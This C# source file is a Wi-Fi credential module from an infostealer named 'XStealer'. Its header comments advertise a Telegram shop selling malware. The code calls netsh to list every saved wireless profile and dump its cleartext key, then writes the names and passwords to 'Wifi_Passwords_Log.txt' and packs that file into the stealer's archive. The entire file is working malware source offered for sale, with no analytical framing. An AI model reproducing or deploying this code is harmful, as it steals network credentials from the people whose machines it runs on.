// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Machine
{
    using System;
    using System.IO;
    using System.Linq;
    using System.Text;
    using Helpers;

    public static class WifiEx
    {
        private static string[] GetProfiles()
        {
            string output = ProcessEx.CmdWifi("/C chcp 65001 && netsh wlan show profile | findstr All");
            try
            {
                string[] wNames = output?.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
                for (int i = 0; i < wNames.Length; i++)
                {
                    wNames[i] = wNames[i].Substring(wNames[i].LastIndexOf(':') + 1).Trim();
                }

                return wNames;
            }
            catch { return null; }
        }

        private static string GetPassword(string profile)
        {
            string output = ProcessEx.CmdWifi($"/C chcp 65001 && netsh wlan show profile name=\"{profile}\" key=clear | findstr Key");
            return output?.Split(':')?.Last().Trim();
        }

        public static void Inizialize()
        {
            using var ms = new MemoryStream { Position = 0 };
            try
            {
                using var data = new StreamWriter(ms, Encoding.Default, 40000);
                string[] profiles = GetProfiles();
                foreach (string profile in profiles.Where(profile => !profile.Equals("65001", StringComparison.OrdinalIgnoreCase)))
                {
                    string pass = GetPassword(profile);
                    data.WriteLine($"Profile Name: {profile}");
                    data.WriteLine($"Password Access: {pass}\r\n");
                }
                data.Flush();
                ZipEx.AddKeyPairStream("Wifi_Passwords_Log.txt", ms?.ToArray() ?? ms.GetBuffer() ?? null);
            }
            catch { }
        }
    }
}